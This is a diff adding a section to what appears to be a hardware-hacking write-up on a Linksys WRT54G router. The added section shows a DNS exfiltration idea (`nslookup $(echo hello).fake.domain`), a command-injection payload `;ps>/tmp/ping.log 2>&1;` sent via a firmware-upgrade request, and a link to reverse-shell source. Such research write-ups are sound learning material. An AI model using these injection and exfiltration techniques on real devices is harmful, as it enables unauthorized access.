@@ -280,6 +280,31 @@ But I did.
 
 Well, what is it then? Why wouldn't it work?
 
+I wanted to be able to get the output from the shell commands that I'm running in order to ease on the debugging process.
+I thought of two ways to do it:
+1. Set myself as the router's DNS server and force the router to issue DNS requests with the command output included.
+For instance, `nslookup $(echo hello).fake.domain`, and then I'd receive a DNS Query request of `hello.fake.domain`.
+However this is a bit tedious because programmatically extracting the data from the DNS requests could be a bit annoying.
+2. Looking for files that are displayed within the web interface and write my output to them.
+
+I then recalled the ping interface.  
+The output was the exact output of the `ping` command.
+I bet that it writes it to a file and that the web server reads from that file.
+
+I opened my disassembler and looked for strings that contain a `/` indicating a file path, and `ping`.
+![Ping Log Ghidra]
+That's it! `/tmp/ping.log` must be the one. Let's test it.
+```py
+In [1]: r = Router('192.169.1.1', ('admin', 'waddup'))
+                                                      
+In [2]: r._run_shell_cmd('ps', with_output=True)      
+[*] Running: ;ps>/tmp/ping.log 2>&1;                  
+[*] Issuing a firmware upgrade.                       
+```
+![Ping Log Output]
+
+Awesome! We can now see the output of our commands.
+
 
 [Router Image]: https://i.imgur.com/sAmlLfJ.jpg
 [Web Interface]: https://i.imgur.com/QJj9iOA.png
@@ -290,3 +315,5 @@ Well, what is it then? Why wouldn't it work?
 [change ui_language]: https://i.imgur.com/xrNitIn.png
 [reverse shell]: https://github.com/elongl/linksys-wrt54g/blob/master/revshell/revshell.c
 [Check Revshell Existence]: https://i.imgur.com/gVYDd0U.png
+[Ping Log Ghidra]: https://i.imgur.com/znqjVnI.png
+[Ping Log Output]: https://i.imgur.com/1cdJgez.png
